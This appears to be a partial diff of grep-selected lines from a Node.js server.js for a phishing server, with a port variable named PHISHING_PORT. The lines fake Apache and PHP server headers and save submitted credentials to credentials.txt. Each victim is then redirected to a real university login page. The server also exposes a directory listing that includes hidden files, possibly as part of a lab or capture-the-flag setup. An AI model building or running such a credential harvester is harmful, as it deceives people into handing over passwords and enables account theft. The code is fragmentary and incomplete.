@@ -1,0 +1,16 @@
+=== server.js ===
+4:const serveIndex = require("serve-index");
+7:const PORT = Number(process.env.PHISHING_PORT || process.env.PORT || 8080);
+13:  res.set("Server", "Apache/2.4.41 (Ubuntu)");
+14:  res.set("X-Powered-By", "PHP/7.4.3");
+33:  // Save to credentials.txt
+34:  const filePath = path.join(__dirname, "credentials.txt");
+35:  fs.appendFile(filePath, line, (error) => {
+37:      console.error("Error writing credentials:", error);
+40:  res.redirect("https://fenix.tecnico.ulisboa.pt/");
+46:  if (/^\/credentials\.txt(\/|$)/.test(requestPath)) {
+49:  if (/^\/var\/log\/credentials\.log(\/|$)/.test(requestPath)) {
+55:// Block access to node_modules/
+63:  if (/^\/node_modules(?:\/|$)/i.test(requestPath)) {
+71:app.use(express.static(__dirname, { dotfiles: "allow", index: false }));
+72:app.use(serveIndex(__dirname, { icons: true, hidden: true }));
